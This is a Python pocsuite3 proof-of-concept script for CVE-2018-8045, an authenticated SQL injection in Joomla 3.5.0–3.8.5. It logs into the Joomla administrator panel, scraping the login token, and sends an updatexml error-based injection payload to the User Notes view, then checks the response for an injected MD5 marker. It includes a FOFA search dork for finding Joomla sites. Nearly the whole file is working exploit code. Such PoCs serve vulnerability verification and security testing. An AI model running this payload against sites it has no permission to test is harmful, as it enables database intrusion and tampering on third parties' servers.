#!/usr/bin/python
# -*- coding: utf-8 -*-
import re
import hashlib
from pocsuite3.api import (
    POCBase, register_poc, requests, logger, Output, random_str, VUL_TYPE, POC_CATEGORY, OrderedDict, OptString
)
from pocsuite3.lib.core.enums import CUSTOM_LOGGING


class TestPOC(POCBase):
    vulID = ''
    version = '1'
    author = 'luckybool1020'+'lzx'
    vulDate = "2018-03-12"  # 漏洞公开的时间,不知道就写今天
    createDate = "2019-11-14"  # 编写 PoC 的日期
    updateDate = "2023-7-28"  # PoC 更新的时间,默认和编写时间一样
    references = ["https://www.seebug.org/vuldb/ssvid-97205", "https://github.com/luckybool1020/CVE-2018-8045",
                  "http://blog.nsfocus.net/cve-2018-804-analysis/"]  # 漏洞地址来源,0day不用写
    name = "Joomla内核SQL注入漏洞原理及poc"  # PoC 名称
    appPowerLink = "https://www.joomla.org/"  # 漏洞厂商主页地址
    appName = "joomla"  # 漏洞应用名称
    appVersion = "3.5.0-3.8.5"  # 漏洞影响版本
    vulType = VUL_TYPE.SQL_INJECTION  # 漏洞类型,类型参考见 漏洞类型规范表
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    install_requires = ['re', 'hashlib']  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    desc = """
            Joomla是一套网站内容管理系统,使用PHP语言和MySQL数据库开发。
            Joomla! 3.5.0 -3.8.5版本对SQL语句内的变量缺少类型转换，
            导致User Notes列表视图内SQL注 入漏洞，可使攻击者访问或修改数据等。
            目前厂商已经发布了升级补丁，修复了这个 安全问题，请用户及时到厂商的主页下载。
        """  # 漏洞简要描述
    dork = {'fofa': 'app="Joomla"'}
    pocDesc = """
            You can use --extra-params=\"{'user': 'xxx','passwd': 'xxx'}\" to exec command
            您可以使用 --extra-params="{'user': 'xxx','passwd': 'xxx'}" 来执行命令
        """  # POC用法描述

    def _options(self):
        o = OrderedDict()
        o["username"] = OptString('', description='这个poc需要用户登录，请输入登录账号', require=True)
        o["password"] = OptString('', description='这个poc需要用户密码，请输出用户密码', require=True)
        return o

    def get_pass(self, joomla_session):
        user, passwd = self.get_options()["username"].value, self.get_options()["password"].value
        url = self.url + '/administrator/index.php'
        content = joomla_session.get(url).content.decode()
        re_para = r'<input type="hidden" name="return" value="(.*?)"/>.*<input type="hidden" name="(.*?)" value="1" />'
        match = re.findall(re_para, content, re.S)
        if match:
            value, token = match[0][0], match[0][1]
        else:
            return self.parse_output(None)
        self.headers = {
            "Content-Type": "application/x-www-form-urlencoded"
        }
        pass_payload = f'username={user}&passwd={passwd}&option=com_login&task=login&return={value}&{token}=1'
        joomla_session.post(
            url=url, params=None, headers=self.headers, data=pass_payload)

    def _verify(self):
        result = {}
        joomla_session = requests.session()
        self.get_pass(joomla_session)
        rand_str = random_str(10, "0123456789")
        url = self.url + '/administrator/index.php?option=com_users&view=notes'
        sqli_payload = 'filter[search]=&list[fullordering]=a.review_time DESC&list[limit]=20&filter[published]=1&filter[category_id]=(updatexml(2,concat(0x7e,(md5({randstr}))),0))'.format(
            randstr=rand_str)
        r = joomla_session.post(url=url, headers=self.headers, data=sqli_payload)
        if r.status_code == 500 and hashlib.md5(rand_str.encode()).hexdigest()[0:31] in r.content.decode():
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = url

        return self.parse_output(result)

    _attack = _verify

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register_poc(TestPOC)
